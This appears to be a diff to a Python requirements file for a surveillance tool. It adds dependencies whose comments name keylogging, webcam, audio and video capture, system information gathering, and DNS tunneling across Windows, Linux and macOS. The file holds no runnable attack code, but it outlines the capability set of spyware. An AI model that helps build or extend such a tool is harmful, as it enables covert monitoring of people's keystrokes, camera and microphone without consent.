@@ -15,9 +15,21 @@ pyautogui>=0.9.53  # For GUI automation
 pywin32>=300; sys_platform == 'win32'  # Windows-specific functionality
 wmi>=1.5.1; sys_platform == 'win32'  # Windows Management Instrumentation
 
-# Surveillance and monitoring
-opencv-python>=4.7.0  # For webcam functionality
+# Surveillance and monitoring - ENHANCED
+numpy>=1.24.0  # Required by OpenCV
+opencv-python>=4.7.0  # For webcam functionality (full version)
+opencv-python-headless>=4.7.0  # Headless version for deployment
 keyboard>=0.13.5  # For keylogging functionality
+
+# Additional image processing (for better compatibility)
+Pillow>=9.5.0  # Enhanced image processing
+imageio>=2.25.0  # Additional image format support
+imageio-ffmpeg>=0.4.8  # Video capture support
+
+# Enhanced system monitoring
+psutil>=5.9.0  # Process and system utilities
+py-cpuinfo>=9.0.0  # CPU information gathering
+GPUtil>=1.4.0  # GPU monitoring (if available)
 
 # Network and security
 dnspython>=2.3.0  # For DNS tunneling
@@ -25,4 +37,23 @@ pycryptodome>=3.18.0  # For encryption
 pyOpenSSL>=23.2.0  # For SSL/TLS support
 
 # File operations
-watchdog>=3.0.0  # For file system monitoring 
+watchdog>=3.0.0  # For file system monitoring
+
+# Additional surveillance capabilities
+pyaudio>=0.2.11  # For audio capture (if needed)
+sounddevice>=0.4.6  # Alternative audio capture
+scipy>=1.10.0  # Scientific computing (for signal processing)
+
+# Platform-specific optimizations
+# Windows
+pywin32>=300; sys_platform == 'win32'
+wmi>=1.5.1; sys_platform == 'win32'
+pywinauto>=0.6.8; sys_platform == 'win32'
+
+# Linux
+python-xlib>=0.33; sys_platform == 'linux'
+python-evdev>=1.6.1; sys_platform == 'linux'
+
+# macOS
+pyobjc-framework-Cocoa>=9.2; sys_platform == 'darwin'
+pyobjc-framework-AVFoundation>=9.2; sys_platform == 'darwin' 
